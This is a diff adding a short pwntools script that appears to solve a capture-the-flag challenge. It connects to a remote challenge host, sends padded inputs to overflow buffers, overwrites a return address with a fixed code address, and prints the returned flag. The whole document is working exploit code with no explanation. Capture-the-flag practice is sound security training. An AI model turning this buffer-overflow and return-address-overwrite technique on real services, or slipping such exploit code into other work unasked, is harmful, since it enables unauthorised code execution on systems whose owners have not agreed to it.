@@ -1,0 +1,23 @@
+from pwn import *
+
+r = remote('hack.bckdr.in', 15132)
+
+r.recv(1024)
+r.sendline('1')
+r.sendline('A'*32 + '2')
+pause(1)
+r.recv(1024)
+r.sendline('0')
+r.sendline('A'*33 + '2')
+pause(1)
+r.recv(1024)
+r.sendline('0')
+r.sendline('A'*40 + '\x2c\x09\x40\x00\x00\x00\x00\x00')
+pause(1)
+r.recv(1024)
+r.sendline('3')
+pause(1)
+r.recv(1024)
+r.sendline('0')
+pause(1)
+print r.recvuntil('}')
